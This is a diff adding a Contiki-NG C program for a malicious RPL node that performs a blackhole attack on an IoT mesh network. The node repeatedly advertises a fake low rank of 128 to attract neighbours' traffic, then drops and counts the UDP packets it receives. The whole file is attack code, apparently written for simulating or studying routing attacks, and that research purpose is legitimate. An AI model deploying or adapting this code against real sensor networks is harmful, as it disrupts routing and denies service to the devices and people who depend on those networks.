@@ -1,0 +1,72 @@
+#include "contiki.h"
+#include "net/routing/rpl-lite/rpl.h"
+#include "net/ipv6/uip-ds6.h"
+#include "net/ipv6/uip.h"
+#include "net/netstack.h"
+#include "net/ipv6/uip-debug.h"
+#include "net/ipv6/uip-icmp6.h"
+#include "net/routing/routing.h"
+#include "sys/log.h"
+#include <stdio.h>
+
+#define LOG_MODULE "Blackhole"
+#define LOG_LEVEL LOG_LEVEL_INFO
+
+static struct uip_udp_conn *server_conn;
+static int dropped_packets = 0;
+
+/*---------------------------------------------------------------------------*/
+PROCESS(malicious_blackhole_process, "Blackhole Attack Node");
+AUTOSTART_PROCESSES(&malicious_blackhole_process);
+/*---------------------------------------------------------------------------*/
+static void
+tcpip_handler(void)
+{
+  if(uip_newdata()) {
+    dropped_packets++;
+    LOG_INFO("⚠️ Dropped packet from ");
+    LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
+    LOG_INFO_("\nTotal packets dropped: %d\n", dropped_packets);
+  }
+}
+/*---------------------------------------------------------------------------*/
+static void
+set_fake_rank()
+{
+  rpl_dag_t *dag;
+  dag = rpl_get_any_dag();
+  if(dag != NULL) {
+    dag->rank = 128;  // Artificially low rank to attract traffic
+    LOG_INFO("🔻 Fake rank set to 128 (Blackhole behavior)\n");
+  }
+}
+/*---------------------------------------------------------------------------*/
+PROCESS_THREAD(malicious_blackhole_process, ev, data)
+{
+  static struct etimer periodic_timer;
+
+  PROCESS_BEGIN();
+
+  LOG_INFO("🚨 Blackhole node starting\n");
+
+  // Create a UDP connection on a fake port
+  server_conn = udp_new(NULL, UIP_HTONS(0), NULL);
+  udp_bind(server_conn, UIP_HTONS(1234));
+
+  etimer_set(&periodic_timer, CLOCK_SECOND * 30);
+
+  while(1) {
+    PROCESS_YIELD();
+
+    if(ev == tcpip_event) {
+      tcpip_handler();
+    }
+
+    if(etimer_expired(&periodic_timer)) {
+      set_fake_rank();  // Every 30s reassert fake low rank
+      etimer_reset(&periodic_timer);
+    }
+  }
+
+  PROCESS_END();
+}
